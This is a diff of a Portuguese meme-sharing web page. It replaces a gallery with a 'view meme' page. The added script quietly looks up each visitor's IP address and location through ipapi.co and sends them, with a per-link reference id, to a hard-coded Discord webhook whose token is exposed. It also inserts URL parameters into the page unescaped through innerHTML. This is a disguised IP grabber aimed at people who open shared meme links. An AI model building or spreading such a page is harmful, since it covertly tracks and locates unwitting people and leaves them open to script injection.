@@ -3,80 +3,73 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Galeria de Memes</title>
+  <title>Visualizar Meme</title>
   <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      background: #f4f4f4;
-    }
-
-    h1 {
-      text-align: center;
-      padding: 20px;
-    }
-
-    .gallery {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 16px;
-      padding: 20px;
-    }
-
-    .meme-card {
-      background: white;
-      padding: 10px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    .meme-card img,
-    .meme-card video {
-      width: 100%;
-      border-radius: 6px;
-    }
-
-    .share-btn {
-      margin-top: 8px;
-      background: #007bff;
-      color: white;
-      padding: 6px 12px;
-      border-radius: 4px;
-      font-size: 14px;
-      border: none;
-      cursor: pointer;
-    }
+    body { font-family: sans-serif; margin: 0; background: #f4f4f4; padding: 20px; }
+    .meme-container { text-align: center; margin-bottom: 20px; }
+    .meme-container img, .meme-container video { max-width: 100%; height: auto; }
+    .info { text-align: center; margin-top: 20px; font-size: 16px; }
   </style>
 </head>
 <body>
-  <h1>Galeria de Memes</h1>
-
-  <div class="gallery">
-    <div class="meme-card">
-      <img src="https://via.placeholder.com/300x200.png?text=Meme+1" alt="Meme 1">
-      <button class="share-btn" onclick="shareMeme('meme1')">Compartilhar</button>
-    </div>
-
-    <div class="meme-card">
-      <video controls>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-      </video>
-      <button class="share-btn" onclick="shareMeme('meme2')">Compartilhar</button>
-    </div>
+  <h2 style="text-align:center">Meme Visualizado</h2>
+  
+  <div class="meme-container">
+    <img id="memeImage" src="" alt="Meme" style="display:none;">
+    <video id="memeVideo" controls style="display:none;">
+      <source src="" type="video/mp4">
+    </video>
+  </div>
+  
+  <div class="info">
+    <p id="info">Carregando dados de localização...</p>
   </div>
 
   <script>
-    function shareMeme(memeId) {
-      const uniqueId = Math.random().toString(36).substring(2, 10);
-      const shareUrl = `${window.location.origin}/memesmundiais/view.html?meme=${memeId}&ref=${uniqueId}`;
+    // Função para exibir o meme com base no parâmetro 'meme' da URL
+    function displayMeme(memeId) {
+      const memeImage = document.getElementById("memeImage");
+      const memeVideo = document.getElementById("memeVideo");
 
-      navigator.clipboard.writeText(shareUrl).then(() => {
-        alert("Link copiado! Envie para alguém:\n" + shareUrl);
-      }).catch(err => {
-        alert("Erro ao copiar link: " + err);
-      });
+      if (memeId === "meme1") {
+        memeImage.src = "https://via.placeholder.com/300x200.png?text=Meme+1";
+        memeImage.style.display = "block";
+        memeVideo.style.display = "none";
+      } else if (memeId === "meme2") {
+        memeVideo.querySelector("source").src = "https://www.w3schools.com/html/mov_bbb.mp4";
+        memeVideo.style.display = "block";
+        memeImage.style.display = "none";
+      } else {
+        // Caso o meme não seja encontrado, não exibe nada
+        document.getElementById("info").innerText = "Meme não encontrado!";
+        return;
+      }
     }
+
+    // Carregar as informações de localização e meme
+    fetch("https://ipapi.co/json")
+      .then(res => res.json())
+      .then(data => {
+        const params = new URLSearchParams(window.location.search);
+        const meme = params.get("meme");
+        const ref = params.get("ref");
+
+        // Exibir as informações de localização
+        const info = `Meme: ${meme}<br>Referência: ${ref}<br>IP: ${data.ip}<br>Local: ${data.city}, ${data.country_name}`;
+        document.getElementById("info").innerHTML = info;
+
+        // Mostrar o meme correto
+        displayMeme(meme);
+
+        // Enviar dados para o Discord via Webhook
+        fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**Meme Visualizado:**\nMeme: ${meme}\nReferência: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}`
+          })
+        });
+      });
   </script>
 </body>
 </html>
